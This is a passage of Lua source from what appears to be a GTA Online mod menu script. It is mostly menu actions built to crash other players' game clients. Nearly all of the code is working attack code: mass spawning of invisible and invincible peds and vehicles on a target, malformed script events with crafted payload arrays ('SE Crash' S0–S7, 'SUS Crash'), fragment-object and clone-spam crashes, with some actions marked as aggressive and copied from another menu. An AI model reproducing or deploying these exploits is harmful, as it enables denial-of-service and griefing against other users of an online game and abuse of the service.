                                coords.z = coords.z + math_random(3, 5)
                            end
                            menu.trigger_commands("anticrashcam".. " on")
                            SpawnedPeds16[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds16[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds16[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds16[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], true)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds16[i], 3, 0, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds16[i])
                            util.yield(5)
                        end
                        menu.trigger_commands("anticrashcam".. " off")
                        local pedhash = util.joaat("cs_milton")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds17 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            SpawnedPeds17[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds17[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds17[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds17[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], false)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds17[i], 3, 0, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds17[i])
                            util.yield(5)
                        end
                        local pedhash = util.joaat("cs_molly")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds18 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            SpawnedPeds18[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds18[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds18[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds18[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], false)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds18[i], 4, 1, 3, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds18[i])
                            util.yield(5)
                        end
                        local pedhash = util.joaat("cs_mrs_thornhill")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds19 = {}
                        local ped_amount = math_random(50, 1000)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            SpawnedPeds19[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds19[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds19[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds19[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], false)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds19[i], 3, 0, 1, 0)
                            util.yield()
                        end
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds19[i])
                            util.yield(5)
                        end
                        local pedhash = util.joaat("cs_nigel")
                        while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                            STREAMING.REQUEST_MODEL(pedhash)
                            util.yield(10)
                        end
                        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                        local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                        SpawnedPeds20 = {}
                        local ped_amount = math_random(7, 10)
                        for i = 1, ped_amount do
                            local pedtype = 0
                            local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                            local coords = PlayerPedCoords
                            local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                            coords.x = coords.x
                            coords.y = coords.y
                            coords.z = coords.z
                            if loc1 == 1 then
                                coords.x = coords.x - math_random(1, 5)
                            else
                                coords.x = coords.x + math_random(1, 5)
                            end
                            if loc2 == 1 then
                                coords.y = coords.y - math_random(1, 5)
                            else
                                coords.y = coords.y + math_random(1, 5)
                            end
                            if loc3 == 1 then
                                coords.z = coords.z - math_random(3, 5)
                            else
                                coords.z = coords.z + math_random(3, 5)
                            end
                            menu.trigger_commands("anticrashcam".. " on")
                            SpawnedPeds20[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds20[i], true, true)
                            TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds20[i], "Walk_Facility", 0, false)
                            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds20[i], true)
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], true)
                            util.yield(5)
                        end
                        for i = 1, ped_amount do
                            ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], true)
                            PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds20[i], 3, 0, 1, 0)
                            util.yield()
                        end
                        menu.trigger_commands("anticrashcam".. " off")
                        util.yield(50)
                        for i = 1, ped_amount do
                            entities.delete(SpawnedPeds20[i])
                            util.yield(5)					
                        end
                        util.yield(10)
                    else
                        util.toast("You can't use it on yourself")
                    end
                    util.toast("Done Component Crash")
                    util.yield(10)
                    menu.trigger_commands("clearworld")
                end, nil, nil, COMMANDPERM_AGGRESSIVE)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
    menu.divider(crashes, "Other Crashes")

    menu.action(crashes, "Cars Crash", {"CarCrashv3"}, "", function(on_toggle)
        local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
        local vehicles = {}
        for i = 1, 4 do
            util.create_thread(function()
                request_model(hashes[i])
                local pcoords = players.get_position(player_id)
                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                for j = 0, 49 do
                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
                end
                for j = 0, 20 do
                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
                end
                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
                for ai = 1, 50 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    pcoords = players.get_position(player_id)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                    util.yield()
                end
                vehicles[#vehicles+1] = veh
            end)
        end
        util.yield(2000)
        for _, v in pairs(vehicles) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
            entities.delete_by_handle(v)
        end
    end)

    local scrshs = menu.list(crashes, "Script Crashes", {}, "")

    menu.action(scrshs, "Script Crash", {}, "", function(on_toggle)
        menu.trigger_commands("scripthost")
        util.yield(25)
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        Fewd.power_crash(player_id)
    end)

    menu.action(scrshs, "SE Crash (S0)", {"crashs0"}, "Not Sure If This Still Works", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        end
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        end
    end)

    menu.action(scrshs, "SE Crash (S1)", {"crashs1"}, "Not Sure If This Still Works", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            end
            menu.trigger_commands("givesh" .. players.get_name(player_id))
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            end
        end)

        

        menu.action(scrshs, "SE Crash (S3)", {"crashs3"}, "Not Sure If This Still Works", function(on_toggle)
            local int_min = -2147483647
            local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1990614866, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
                end
                menu.trigger_commands("givesh" .. players.get_name(player_id))
                util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1990614866, 0, 0, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
                util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
                end
            end)  

        menu.action(scrshs, "SE Crash (S4)", {"crashs4"}, "Not Sure If This Still Works", function(on_toggle)
            local int_min = -2147483647
            local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
                end
                menu.trigger_commands("givesh" .. players.get_name(player_id))
                util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
                util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
                end
            end)      

   menu.action(scrshs, "SE Crash (S7)", {"crashs7"}, "Not Sure If This Still Works", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            end
            menu.trigger_commands("givesh" .. players.get_name(player_id))
            util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            end
        end)

        menu.action(scrshs, "SUS Crash", {"togglesus"}, "Not Sure If This Still Works", function(on_toggle)

                local int_min = -2147483647
                local int_max = 2147483647
                    for i = 1, 15 do
                        util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, player_id, math.random(int_min, int_max), math.random(int_min, int_max), 
                        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                        math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                        util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                        end
                        util.yield()
                    for i = 1, 15 do
                        util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, player_id, math.random(int_min, int_max)})
                        util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, math.random(int_min, int_max)})
                        util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, player_id, math.random(int_min, int_max)})
                        util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                        util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
                        util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
                        util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
                        util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
                        end
                        menu.trigger_commands("explode" .. players.get_name(player_id))
                        util.yield(100)
                        menu.trigger_commands("givesh" .. players.get_name(player_id))
                        util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
                        util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
                        util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
                        util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
                    end)

    local modelc = menu.list(crashes, "Model Crashes", {}, "")


    menu.action(modelc, "FragTest", {"FragTestCrashv2"}, "", function()
        Fewd.BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            menu.trigger_commands("clearworld")
        end)
    end)

    menu.action(modelc, "FragTest X15 With Twist", {"FragTestCrashv3"}, "Causes (XJ & XF)", function()
        Fewd.BlockSyncs(player_id, function()
            numberofft = 15
            local cord = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
            for numberofft = 0, 15 do
            local object = entities.create_object(3613262246, cord)
            local object2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), cord)
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            end
            util.yield(5000)
            menu.trigger_commands("clearworld")
        end)

    end)
	
	menu.action(modelc, "Jesus Crash v1", {"JesusCrashv1"}, "Skid from x-force", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = players.get_position(player_id)
        local mdl = util.joaat("u_m_m_jesus_01")
        local veh_mdl = util.joaat("oppressor")
        request_model(veh_mdl)
        request_model(mdl)
        for i = 1, 10 do
            if not players.exists(player_id) then return end
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local jesus = entities.create_ped(2, mdl, pos, 0)
            PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
            util.yield(100)
            TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
            util.yield(1000)
            entities.delete_by_handle(jesus)
            entities.delete_by_handle(veh)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)

    local pclpid = {}

    menu.action(modelc, "XC Crash (Clones Crash)", {"XCCrash"}, "Clones the player causing (XC)", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        for i = 1, 35 do
            local pclone = entities.create_ped(36, ENTITY.GET_ENTITY_MODEL(p), c, 0)
            pclpid [#pclpid + 1] = pclone 
            PED.CLONE_PED_TO_TARGET(p, pclone)
        end
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
        all_peds = entities.get_all_peds_as_handles()
        local last_ped = 0
        local last_ped_ht = 0
        for k,ped in pairs(all_peds) do
            if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                Fewd.get_control_request(ped)
                if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                end
    
                ENTITY.DETACH_ENTITY(ped, false, false)
                if last_ped ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
                else
                    ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                end
                last_ped = ped
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(modelc, "Big Chunxus Crash", {"BigChunxusCrash"}, "Skid from x-force (Big CHUNGUS)", function()
        menu.trigger_commands("anticrashcamera".. " on")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local mdl3 = util.joaat("A_F_M_ProlHost_01")
        local mdl4 = util.joaat("A_M_M_SouCent_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        local animation_tonta = ("anim@mp_player_intupperstinker")
        Fewd.anim_request(animation_tonta)
        request_model(veh_mdl)
        request_model(veh_mdl2)
        request_model(mdl)
        request_model(mdl2)
        request_model(mdl3)
        request_model(mdl4)
        for i = 1, 20 do
            local ped1 = entities.create_ped(1, mdl, pos, 0)
            local ped_ = entities.create_ped(1, mdl2, pos, 0)
            local ped3 = entities.create_ped(1, mdl3, pos, 0)
            local ped3 = entities.create_ped(1, mdl4, pos, 0)
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos, 0)
            util.yield(100)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
            
            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
            
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
